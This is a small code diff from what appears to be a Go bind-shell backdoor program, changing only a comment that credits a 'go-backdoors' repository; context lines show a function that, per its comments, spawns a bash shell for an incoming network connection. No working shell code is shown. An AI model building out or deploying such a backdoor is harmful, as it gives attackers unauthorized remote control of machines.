@@ -7,7 +7,7 @@ import
 "os/exec"
 "syscall"
 )
-//shell handing credits: https://github.com/LukeDSchenk/go-backdoors/blob/master/bindshell.go
+//learned shell handling from: https://github.com/LukeDSchenk/go-backdoors/blob/master/bindshell.go
 //After a connection is made, it creates a bash shell
 func spawnshell(conn net.Conn) {
     //lists the machine that connected
